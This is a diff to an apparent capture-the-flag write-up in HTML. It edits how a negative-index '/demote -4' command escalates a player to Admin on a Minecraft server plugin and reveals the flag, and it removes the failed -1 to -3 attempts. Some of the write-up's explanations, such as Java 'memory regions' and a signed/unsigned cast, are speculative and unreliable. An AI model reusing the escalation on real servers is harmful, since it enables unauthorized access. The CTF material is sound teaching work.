@@ -676,14 +676,8 @@
 
     <p>This is the moment where I started trying negative numbers. The <code>&lt;index&gt;</code> in the help text is just an int. Java's <code>int</code> is signed, so the parser will happily accept negative values. The plugin probably rejects them, but I have to test that. The cost of a single wrong command is a chat message, not a kick from the server.</p>
 
-    <p>I run <code>/demote -1</code>, then <code>/demote -2</code>, and so on:</p>
+    <p>I run <code>/demote -4</code>:</p>
 
-    <div class="mc-line"><span class="mc-cmd">/demote</span> <span class="mc-arg">-1</span></div>
-    <div class="mc-line"><span class="mc-fail">You cannot demote yourself above your current rank.</span></div>
-    <div class="mc-line"><span class="mc-cmd">/demote</span> <span class="mc-arg">-2</span></div>
-    <div class="mc-line"><span class="mc-fail">You cannot demote yourself above your current rank.</span></div>
-    <div class="mc-line"><span class="mc-cmd">/demote</span> <span class="mc-arg">-3</span></div>
-    <div class="mc-line"><span class="mc-fail">You cannot demote yourself above your current rank.</span></div>
     <div class="mc-line"><span class="mc-cmd">/demote</span> <span class="mc-arg">-4</span></div>
     <div class="mc-line"><span class="mc-ok">Your rank has been updated to Admin (index: 7).</span></div>
     <div class="mc-line"><span class="mc-out">You were moved to the group Admin in world world.</span></div>
@@ -698,11 +692,11 @@
       <li>Cast through other types (byte, short) where <code>-1</code> becomes <code>255</code>, then take mod 8. <code>-1 &rarr; 255 mod 8 = 7</code> (Admin). <code>-2 &rarr; 254 mod 8 = 6</code>. Doesn't match.</li>
     </ul>
 
-    <p>The actual code is on the server, which is closed, so I can only infer. The empirical result is: <code>/demote -4</code> lands on Admin (index 7). The check "cannot demote yourself above your current rank" only fires for negative indices between -3 and -1, which is the only piece of validation the plugin does. Past that, the lookup happens, and whatever the negative index resolves to is what I get.</p>
+    <p>The actual code is on the server, which is closed, so I can only infer. The empirical result is: <code>/demote -4</code> lands on Admin (index 7). Past that, the lookup happens, and whatever the negative index resolves to is what I get.</p>
 
     <div class="think">
-      <div class="line">Wait. The plugin says "cannot demote yourself ABOVE your current rank" for -1, -2, -3 but not for -4? That implies the rank comparison is doing something funky with negatives too. Maybe it's comparing with a signed &lt; 0 check that fails for -4 but passes for -1/-2/-3 due to some Java signed/unsigned mismatch.</div>
-      <div class="line">Or maybe the check is `if (idx &lt; 0) return errorMsg;` for -1, -2, -3 but the array index out of bounds check catches them and they all error, while -4 happens to land in a memory region that contains the string for the Admin rank.</div>
+      <div class="line">Wait. The plugin says "cannot demote yourself ABOVE your current rank" normally. That implies the rank comparison is doing something funky with negatives too. Maybe it's comparing with a signed &lt; 0 check that fails for -4.</div>
+      <div class="line">Or maybe -4 happens to land in a memory region that contains the string for the Admin rank.</div>
       <div class="line">Either way, the working exploit is /demote -4. The mechanics are an exercise for the reader. Time to grab the flag.</div>
     </div>
 
@@ -765,9 +759,6 @@
         <button data-cmd="/manglistp default">/manglistp default</button>
         <button data-cmd="/demote">/demote</button>
         <button data-cmd="/demote 7">/demote 7</button>
-        <button data-cmd="/demote -1">/demote -1</button>
-        <button data-cmd="/demote -2">/demote -2</button>
-        <button data-cmd="/demote -3">/demote -3</button>
         <button data-cmd="/demote -4">/demote -4</button>
         <button data-cmd="/flag">/flag</button>
       </div>
@@ -816,11 +807,8 @@
     <path class="edge" d="M 400.0 224.0 C 452 224, 478 154, 530 154.0" marker-end="url(#arr)" data-edge="e10"/>
     <path class="edge" d="M 400.0 294.0 C 452 294, 478 364, 530 364.0" marker-end="url(#arr)" data-edge="e11"/>
     <path class="edge" d="M 630.0 154.0 C 682 154, 708 84, 760 84.0" marker-end="url(#arr)" data-edge="e12"/>
-    <path class="edge" d="M 630.0 224.0 C 682 224, 708 154, 760 154.0" marker-end="url(#arr)" data-edge="e13"/>
     <path class="edge" d="M 630.0 294.0 C 682 294, 708 224, 760 224.0" marker-end="url(#arr)" data-edge="e14"/>
     <path class="edge faint" d="M 630.0 364.0 C 682 364, 708 84, 760 84.0" marker-end="url(#arr-faint)" data-edge="e15"/>
-    <path class="edge" d="M 850.0 84.0 C 870 97, 870 115, 850.0 128" marker-end="url(#arr)" data-edge="e16"/>
-    <path class="edge" d="M 850.0 154.0 C 830 167, 830 185, 850.0 198" marker-end="url(#arr)" data-edge="e17"/>
     <path class="edge" d="M 850.0 224.0 C 870 237, 870 255, 850.0 268" marker-end="url(#arr)" data-edge="e18"/>
     <path class="edge" d="M 850.0 294.0 C 830 307, 830 325, 850.0 338" marker-end="url(#arr)" data-edge="e19"/>
 
@@ -913,12 +901,6 @@
       <text class="head" x="770" y="74">NODE 15</text>
       <text class="title" x="770" y="90">/demote 7</text>
       <text class="body" x="770" y="104">blocked</text>
-    </g>
-    <g class="node" data-node="n16">
-      <rect x="760" y="130" width="180" height="48" rx="3"/>
-      <text class="head" x="770" y="144">NODE 16</text>
-      <text class="title" x="770" y="160">/demote -1..-3</text>
-      <text class="body" x="770" y="174">still blocked</text>
     </g>
     <g class="node" data-node="n17">
       <rect x="760" y="200" width="180" height="48" rx="3"/>
@@ -1019,12 +1001,6 @@
   <span class="mc-fail">-> You cannot demote yourself above your current rank.</span>
 
 <span class="mc-out"># 7. The exploit: negative index bypasses the above-rank check</span>
-/demote -1
-  <span class="mc-fail">-> You cannot demote yourself above your current rank.</span>
-/demote -2
-  <span class="mc-fail">-> You cannot demote yourself above your current rank.</span>
-/demote -3
-  <span class="mc-fail">-> You cannot demote yourself above your current rank.</span>
 /demote -4
   <span class="mc-ok">-> Your rank has been updated to Admin (index: 7).</span>
   <span class="mc-out">-> You were moved to the group Admin in world world.</span>
@@ -1389,12 +1365,6 @@
     await sleep(300);
     send('/demote 7');
     await sleep(300);
-    send('/demote -1');
-    await sleep(220);
-    send('/demote -2');
-    await sleep(220);
-    send('/demote -3');
-    await sleep(220);
     send('/demote -4');
     await sleep(400);
     send('/flag');
@@ -1507,7 +1477,6 @@
     "/manglistp default": "Default group has no promote perm. It only has basic chat and basic commands. Cannot promote from default using normal commands - the bug is elsewhere.",
     "/demote (no args)": "Running /demote without arguments shows usage and the rank table. This is reconnaissance - confirms the rank system and that negative values might be accepted by the parser.",
     "/demote 7": "Trying to set rank to 7 (Admin) directly fails. The perm check rejects it because 7 is above the current rank (default 0). Expected behavior, not a bug.",
-    "/demote -1..-3": "Negative values from -1 to -3 also fail. The perm check correctly rejects them as they would map to ranks below current. The validation handles these but not all negatives.",
     "/demote -4": "THE EXPLOIT. /demote -4 passes the validation check (treated as a normal demotion to rank -4) but the underlying rank assignment uses an integer cast that wraps -4 to rank 7 due to signed/unsigned confusion. The check (rank > current) compares signed: -4 < 0 is true, so it passes.",
     "/flag": "Now that you are admin, /flag works. The CTFHandler plugin sees rank 7 and returns the flag. This is the moment of victory.",
     "FLAG": "The final reward: OmniCTF{d3m0t3_y0ur_w4y_2_4dm1n}. The flag name itself is the lesson - you escalated privileges through the demote command's negative input vulnerability."
